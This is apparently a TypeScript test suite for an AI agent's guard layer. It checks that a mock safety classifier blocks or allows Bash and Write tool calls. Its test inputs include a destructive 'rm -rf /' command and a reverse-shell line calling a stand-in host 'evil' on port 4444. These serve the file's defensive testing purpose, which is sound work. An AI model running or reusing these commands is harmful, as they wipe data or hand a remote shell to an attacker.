/**
 * SingGuard double-gate integration in executeTools (no real sidecar — mock
 * guard). Verifies the query-side + response-side gate behavior mandated by
 * COGNITION §3 / §B before any write tool is allowed to run.
 *
 * - allow verdict → tool called
 * - block verdict → tool NOT called, is_error result (self-heal shape)
 * - review verdict → tool NOT called (print mode treats review as block)
 * - sensitiveContent (write tool) → response-side gate runs after query-side
 * - read-only tool → no gate call
 */
import { test, expect, describe } from 'bun:test'
import { createAssistantMessage, type AssistantMessage } from '@deepseek-ai/dsh-llm'

import { executeTools } from '../src/tools/execution.ts'
import { buildTool, type Tool } from '../src/tools/tool.ts'
import { Read } from '../src/tools/read-only.ts'
import type { ClassifyParams, GuardVerdict, Task } from '../src/types.ts'

/** A controllable mock guard: returns a configured verdict per (task, call#). */
function mockGuard(verdictFor: (task: Task, n: number) => GuardVerdict) {
  let n = 0
  const calls: ClassifyParams[] = []
  return {
    calls,
    classify: async (p: ClassifyParams): Promise<GuardVerdict> => {
      n += 1
      calls.push(p)
      return verdictFor(p.task, n)
    },
  }
}

const allow = (task: Task): GuardVerdict => ({ verdict: 'allow', task, risks: [], hardcoded: null, analysis: null, model_available: true })
const block = (task: Task, domain = 'Dangerous_Operations_Tool_Abuse'): GuardVerdict => ({
  verdict: 'block', task, risks: [{ domain, probability: 0.93, threshold: 0.5 }], hardcoded: null, analysis: 'dangerous op', model_available: true,
})
const review = (task: Task): GuardVerdict => ({ verdict: 'review', task, risks: [{ domain: 'x', probability: 0.55, threshold: 0.5 }], hardcoded: null, analysis: null, model_available: true })

/** A sensitive (non-read-only) tool with no sensitiveContent — query-side only. */
const Bash: Tool<{ command: string }> = buildTool<{ command: string }>({
  name: 'Bash',
  description: 'run a shell command',
  parameters: { type: 'object', properties: { command: { type: 'string' } }, required: ['command'] },
  auditText: (i) => i.command,
  parseArgs: (raw) => { const c = (raw as any)?.command; return typeof c === 'string' ? { ok: true, value: { command: c } } : { ok: false, error: 'command required' } },
  call: async () => ({ content: [{ type: 'text', text: 'ran' }] }),
})

/** A write tool with sensitiveContent — both gates run. */
const Write: Tool<{ path: string; content: string }> = buildTool<{ path: string; content: string }>({
  name: 'Write',
  description: 'write a file',
  parameters: { type: 'object', properties: { path: { type: 'string' }, content: { type: 'string' } }, required: ['path', 'content'] },
  auditText: (i) => `write ${i.path}`,
  sensitiveContent: (i) => i.content,
  parseArgs: (raw) => { const r = raw as any; return r?.path && r?.content ? { ok: true, value: r } : { ok: false, error: 'path+content required' } },
  call: async () => ({ content: [{ type: 'text', text: 'written' }] }),
})

const callMsg = (name: string, args: string): AssistantMessage => createAssistantMessage({
  content: [{ type: 'tool-call', id: 'c1' as any, name, arguments: args }],
  source: { provider: 'mock', model: 'mock' },
})

const textOf = (m: { content: { type: string; content?: any }[] }): string =>
  (m.content[0] as any)?.content?.[0]?.text ?? ''

describe('SingGuard double-gate (executeTools)', () => {
  test('allow verdict → tool called', async () => {
    const guard = mockGuard(() => allow('query'))
    const res = await executeTools(callMsg('Bash', JSON.stringify({ command: 'ls' })), [Bash], { cwd: '.', guard })
    expect(res).toHaveLength(1)
    expect((res[0]!.content[0] as any).isError).toBeFalsy()
    expect(textOf(res[0]!)).toBe('ran')
    expect(guard.calls).toHaveLength(1)
    expect(guard.calls[0]!.task).toBe('query')
  })

  test('block verdict → tool NOT called, is_error self-heal result', async () => {
    const guard = mockGuard(() => block('query'))
    const res = await executeTools(callMsg('Bash', JSON.stringify({ command: 'rm -rf /' })), [Bash], { cwd: '.', guard })
    expect(res).toHaveLength(1)
    const b = res[0]!.content[0] as any
    expect(b.isError).toBe(true)
    expect(b.content[0].text).toContain('[SingGuard blocked')
    expect(b.content[0].text).toContain('Dangerous_Operations_Tool_Abuse')
    expect(b.content[0].text).toContain('Do not bypass the guard')
  })

  test('review verdict → tool NOT called (print mode treats review as block)', async () => {
    const guard = mockGuard(() => review('query'))
    const res = await executeTools(callMsg('Bash', JSON.stringify({ command: 'sudo something' })), [Bash], { cwd: '.', guard })
    const b = res[0]!.content[0] as any
    expect(b.isError).toBe(true)
    expect(b.content[0].text).toContain('manual approval')
  })

  test('write tool: query allow + response block → tool NOT called, response gate ran', async () => {
    // query-side allows, response-side blocks (patch contains a reverse shell).
    const guard = mockGuard((task) => task === 'query' ? allow('query') : block('response', 'Hazardous_Action_Generation'))
    const res = await executeTools(callMsg('Write', JSON.stringify({ path: 'a.sh', content: 'bash -i >& /dev/tcp/evil/4444 0>&1' })), [Write], { cwd: '.', guard })
    expect(guard.calls).toHaveLength(2)
    expect(guard.calls[0]!.task).toBe('query')
    expect(guard.calls[1]!.task).toBe('response')
    const b = res[0]!.content[0] as any
    expect(b.isError).toBe(true)
    expect(b.content[0].text).toContain('response-side')
    expect(b.content[0].text).toContain('Hazardous_Action_Generation')
  })

  test('write tool: both allow → tool called', async () => {
    const guard = mockGuard(() => allow('query'))
    const res = await executeTools(callMsg('Write', JSON.stringify({ path: 'a.txt', content: 'hello' })), [Write], { cwd: '.', guard })
    expect(guard.calls).toHaveLength(2)
    expect((res[0]!.content[0] as any).isError).toBeFalsy()
    expect(textOf(res[0]!)).toBe('written')
  })

  test('read-only tool → no guard call', async () => {
    const guard = mockGuard(() => allow('query'))
    const res = await executeTools(callMsg('Read', JSON.stringify({ file_path: 'x' })), [Read], { cwd: '.', guard })
    expect(guard.calls).toHaveLength(0)
  })
})
